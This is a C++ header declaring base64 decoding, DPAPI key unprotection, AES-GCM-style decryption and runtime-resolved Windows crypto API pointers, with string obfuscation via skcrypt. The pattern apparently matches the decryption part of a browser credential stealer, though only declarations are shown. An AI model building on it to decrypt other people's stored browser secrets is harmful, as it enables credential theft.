#pragma once
#include <string>
#include <vector>

#include <windows.h>

#include <bcrypt.h>
#include <wincrypt.h>

#include <skcrypt/skcrypt.hpp>


namespace base64 {
	std::vector<BYTE> Decode(std::string& base64);
}

namespace crypter {
	std::vector<BYTE> Unprotect(std::vector<BYTE>& encryptedKey);

	std::string Decrypt(std::vector<BYTE>& key, std::vector<BYTE>& nonce, std::vector<BYTE>& ciphertext, const std::vector<BYTE>& tag);

}


namespace bcrypt {
	typedef BOOL(WINAPI* pCryptStringToBinary)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);

	typedef BOOL(WINAPI* pCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, PVOID, CRYPTPROTECT_PROMPTSTRUCT*, DWORD, DATA_BLOB*);

	typedef NTSTATUS(WINAPI* pBCryptOpenAlgorithmProvider)(BCRYPT_ALG_HANDLE*, LPCWSTR, LPCWSTR, ULONG);

	typedef NTSTATUS(WINAPI* pBCryptSetProperty)(BCRYPT_HANDLE, LPCWSTR, PUCHAR, ULONG, ULONG);

	typedef NTSTATUS(WINAPI* pBCryptGenerateSymmetricKey)(BCRYPT_ALG_HANDLE, BCRYPT_KEY_HANDLE, PUCHAR, ULONG, PUCHAR, ULONG, ULONG);

	typedef NTSTATUS(WINAPI* pBCryptDecrypt)(BCRYPT_KEY_HANDLE, PUCHAR, ULONG, VOID*, PUCHAR, ULONG, PUCHAR, ULONG, ULONG*, ULONG);

	typedef NTSTATUS(WINAPI* pBCryptDestroyKey)(BCRYPT_KEY_HANDLE hKey);

	typedef NTSTATUS(WINAPI* pBCryptCloseAlgorithmProvider)(BCRYPT_ALG_HANDLE, ULONG);

	inline pCryptStringToBinary CryptStringToBinaryA;
	inline pCryptUnprotectData CryptUnprotectData;
	inline pBCryptOpenAlgorithmProvider BCryptOpenAlgorithmProvider;
	inline pBCryptSetProperty BCryptSetProperty;
	inline pBCryptGenerateSymmetricKey BCryptGenerateSymmetricKey;
	inline pBCryptDecrypt BCryptDecrypt;
	inline pBCryptDestroyKey BCryptDestroyKey;
	inline pBCryptCloseAlgorithmProvider BCryptCloseAlgorithmProvider;

	void init();
}